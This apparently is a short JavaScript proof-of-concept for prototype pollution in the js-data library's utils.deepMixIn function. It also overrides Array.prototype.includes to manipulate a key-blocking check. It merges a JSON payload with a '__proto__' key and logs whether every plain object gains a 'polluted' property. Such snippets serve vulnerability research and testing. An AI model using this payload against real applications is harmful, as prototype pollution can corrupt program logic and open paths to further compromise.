Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const {utils} = require('js-data');
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
utils.deepMixIn({}, source);
console.log({}.polluted);